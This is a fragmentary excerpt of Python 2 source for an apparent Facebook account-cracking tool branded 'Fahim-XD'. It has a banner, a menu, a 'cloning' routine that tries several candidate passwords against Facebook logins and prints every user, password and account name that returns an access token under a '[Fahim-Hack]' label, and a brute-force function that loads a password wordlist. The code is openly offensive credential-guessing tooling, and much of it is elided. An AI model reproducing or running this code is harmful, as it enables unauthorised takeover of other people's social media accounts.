...
os.system("clear")
print  """
 \033[1;91m   ____     __   _           _  _____ 
\033[1;91m  / __/__ _/ /  (_)_ _  ____| |/_/ _ \
\033[1;95m / _// _ `/ _ \/ /  ' \/___/>  </ // /
\033[1;92m/_/  \_,_/_//_/_/_/_/_/   /_/|_/____/ 
                                      

"""

jalan("\033[1;97m•◈•───────•◈ github.com/Fahim-XD •◈•───────•◈•")  
...
jalan("   \033[1;91m Fahim-XD WP - +8801880******** ")

jalan("   \033[1;93m Welcome to Fahim-XD Creations ")

jalan("\033[1;97m•◈•──────────•◈•\033[1;96mTeam-Legion\033[1;96m•◈•──────────•◈•")
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful With Fahim-XD,...'
				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA')
...
def menu():
	...
	print "\033[1;32;40m[2] \033[1;33;40m══Update Fahim"																														
...
def pilih_super():
	...
	jalan('                    \033[1;97mFahim-XD start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;97m[Fahim-Hack] \033[1;97m ' + user  + ' \033[1;97m | \033[1;97m ' + pass4 + ' 👽 ' + b['name']
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Fahim-Hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\033[1;97m[Fahim-Hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\033[1;97m[Fahim-Hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
...
def brute():
    ...
    try:
        ...
        try:
            ...
            passw = raw_input('\033[1;97m[+] \033[1;97mWordlist \033[1;97mext(Fahim.txt) \033[1;97m: \033[1;97m')
            total = open(passw, 'r')
